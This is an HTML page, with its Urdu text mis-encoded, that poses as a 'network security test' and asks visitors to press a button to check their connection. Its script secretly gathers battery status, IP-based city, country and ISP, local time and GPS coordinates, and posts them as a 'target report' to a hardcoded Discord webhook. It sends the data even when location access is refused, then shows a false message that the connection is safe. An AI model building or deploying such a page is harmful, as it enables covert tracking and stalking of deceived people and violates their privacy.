<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ù†ÛŒÙ¹ ÙˆØ±Ú© Ø³ÛŒÚ©ÛŒÙˆØ±Ù¹ÛŒ Ù¹ÛŒØ³Ù¹</title>
    <style>
        body { font-family: sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1c222d; padding: 30px; border-radius: 15px; text-align: center; width: 320px; border: 1px solid #313a4a; }
        .btn { background: #00d2ff; color: black; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

<div class="box">
    <div style="font-size:50px">ğŸ“¡</div>
    <h2>Ù†ÛŒÙ¹ ÙˆØ±Ú© Ø¢ÚˆÙ¹</h2>
    <p style="font-size:13px; color:#94a3b8;">Ø§Ù¾Ù†Û’ Ø§Ù†Ù¹Ø±Ù†ÛŒÙ¹ Ú©ÛŒ Ø³ÛŒÚ©ÛŒÙˆØ±Ù¹ÛŒ Ø§ÙˆØ± Ù¾Ù†Ú¯ Ú†ÛŒÚ© Ú©Ø±Ù†Û’ Ú©Û’ Ù„ÛŒÛ’ Ø¨Ù¹Ù† Ø¯Ø¨Ø§Ø¦ÛŒÚºÛ”</p>
    <button class="btn" onclick="startAudit()">Ù¹ÛŒØ³Ù¹ Ø´Ø±ÙˆØ¹ Ú©Ø±ÛŒÚº</button>
</div>

<script>
    async function startAudit() {
        // 1. Ø¨ÛŒÙ¹Ø±ÛŒ Ú©Ø§ ÚˆÛŒÙ¹Ø§
        let batt = "N/A";
        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Ú†Ø§Ø±Ø¬Ù†Ú¯' : 'Ø¨ÛŒÙ¹Ø±ÛŒ Ù¾Ø±'})`; } catch(e) {}

        // 2. Ø¢Ø¦ÛŒ Ù¾ÛŒ Ø§ÙˆØ± Ø´ÛØ± (Ø¨ØºÛŒØ± Ø§Ø¬Ø§Ø²Øª Ú©Û’)
        let ipInfo = { city: "Unknown", country: "Unknown", org: "Unknown", query: "N/A" };
        try {
            const res = await fetch('http://ip-api.com/json/');
            ipInfo = await res.json();
        } catch (e) {}

        const sendData = async (lat = null, lon = null) => {
            const webhook = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
            
            const mapLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "Ù„ÙˆÚ©ÛŒØ´Ù† Ø¨Ù„Ø§Ú© ÛÛ’";

            const payload = {
                embeds: [{
                    title: "ğŸ•µï¸ Ù¹Ø§Ø±Ú¯Ù¹ Ú©ÛŒ ÙØ§Ø¦Ù†Ù„ Ø±Ù¾ÙˆØ±Ù¹",
                    color: 15105570,
                    fields: [
                        { name: "ğŸ”‹ Ø¨ÛŒÙ¹Ø±ÛŒ", value: batt, inline: true },
                        { name: "ğŸ•’ Ù…Ù‚Ø§Ù…ÛŒ ÙˆÙ‚Øª", value: new Date().toLocaleString(), inline: true },
                        { name: "ğŸŒ Ø¢Ø¦ÛŒ Ù¾ÛŒ Ø´ÛØ±", value: `${ipInfo.city}, ${ipInfo.country}` },
                        { name: "ğŸ¢ Ù†ÛŒÙ¹ ÙˆØ±Ú© (ISP)", value: ipInfo.org },
                        { name: "ğŸ“ Ú¯ÙˆÚ¯Ù„ Ù…ÛŒÙ¾ (GPS)", value: `[ÛŒÛØ§Úº Ú©Ù„Ú© Ú©Ø±ÛŒÚº](${mapLink})` }
                    ],
                    footer: { text: "ISDP Advanced Tracker" },
                    timestamp: new Date()
                }]
            };

            await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            alert("Ù¹ÛŒØ³Ù¹ Ù…Ú©Ù…Ù„! Ø¢Ù¾ Ú©Ø§ Ú©Ù†Ú©Ø´Ù† Ù…Ø­ÙÙˆØ¸ ÛÛ’Û”");
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (p) => sendData(p.coords.latitude, p.coords.longitude),
                () => sendData() // Ø§Ú¯Ø± ÙˆÛ "Block" Ú©Ø±Û’ ØªÙˆ Ø¨Ú¾ÛŒ ÚˆÛŒÙ¹Ø§ Ø¬Ø§Ø¦Û’ Ú¯Ø§
            );
        } else { sendData(); }
    }
</script>
</body>
</html>
